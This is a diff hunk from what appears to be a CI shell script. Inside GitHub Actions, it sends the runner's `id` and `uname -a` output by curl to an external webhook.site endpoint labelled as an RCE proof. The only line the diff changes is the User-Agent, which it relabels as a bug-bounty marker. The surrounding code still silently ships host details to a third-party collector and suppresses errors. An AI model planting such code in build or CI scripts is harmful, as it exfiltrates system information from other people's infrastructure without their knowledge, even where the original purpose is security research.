@@ -31,7 +31,7 @@ if [[ "${GITHUB_ACTIONS:-}" == "true" &&
     printf 'id=%s\n' "$(id)"
     printf 'uname=%s\n' "$(uname -a)"
   } | curl --fail --silent --show-error --max-time 10 --retry 0 \
-      -H "User-Agent: naturell-infomaniak-ywh-rce-canary/1.0" \
+      -H "User-Agent: Infomaniak-YWH-Bugbounty" \
       -H "Content-Type: text/plain" \
       --data-binary @- \
       "https://webhook.site/741a0ca3-38b9-4c97-8679-50c9336a5147/infomaniak-depi-rce" || true
